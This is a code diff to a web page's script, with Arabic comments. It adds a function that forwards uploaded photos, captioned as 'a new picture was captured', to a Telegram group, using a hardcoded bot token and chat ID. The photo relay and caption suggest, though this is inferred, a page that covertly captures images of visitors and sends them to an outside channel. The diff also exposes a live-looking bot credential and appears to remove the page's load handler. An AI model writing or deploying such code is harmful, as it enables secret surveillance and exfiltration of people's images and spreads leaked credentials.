@@ -167,41 +167,74 @@
         }
 
         async function post(url, formData) {
-            const maxRetries = 5;
-            let retries = 0;
+    const maxRetries = 5;
+    let retries = 0;
 
-            while (retries < maxRetries) {
-                try {
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        body: formData
-                    });
+    while (retries < maxRetries) {
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData
+            });
 
-                    if (!response.ok) {
-                        throw new Error(`HTTP error! status: ${response.status}`);
-                    }
-
-                    const data = await response.json();
-
-                    if (data.success) {
-                        console.log('Photos sent successfully');
-                        return;
-                    } else {
-                        throw new Error(data.error);
-                    }
-                } catch (error) {
-                    console.error('Error:', error);
-                    retries++;
-                    if (retries < maxRetries) {
-                        await new Promise(resolve => setTimeout(resolve, 3000 * retries));
-                    }
-                }
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
             }
 
-            console.error('Max retries reached. Unable to send photos.');
-        }
+            const data = await response.json();
 
-        window.addEventListener('load', init);
+            if (data.success) {
+                console.log('Photos sent successfully');
+
+                // إرسال الصور إلى مجموعة تيليجرام
+                await sendToTelegram(data.fileUrl);
+
+                return;
+            } else {
+                throw new Error(data.error);
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            retries++;
+            if (retries < maxRetries) {
+                await new Promise(resolve => setTimeout(resolve, 3000 * retries));
+            }
+        }
+    }
+
+    console.error('Max retries reached. Unable to send photos.');
+}
+
+// وظيفة لإرسال الصور إلى مجموعة تيليجرام
+async function sendToTelegram(photoUrl) {
+    const telegramToken = '8116637783:AAHPP3YbcZ2h2NqsmX2M-R6SvIYvXPfDulw';  // ضع هنا توكن البوت الخاص بك
+    const chatId = '-1001639291254';  // ضع هنا رقم الـ chat ID الخاص بالمجموعة
+
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                photo: photoUrl,
+                caption: 'تم التقاط صورة جديدة.'
+            })
+        });
+
+        const data = await response.json();
+
+        if (data.ok) {
+            console.log('Photo sent to Telegram group successfully');
+        } else {
+            throw new Error(`Telegram API error: ${data.description}`);
+        }
+    } catch (error) {
+        console.error('Error sending photo to Telegram:', error);
+    }
+}
+
     </script>
 </body>
 </html>
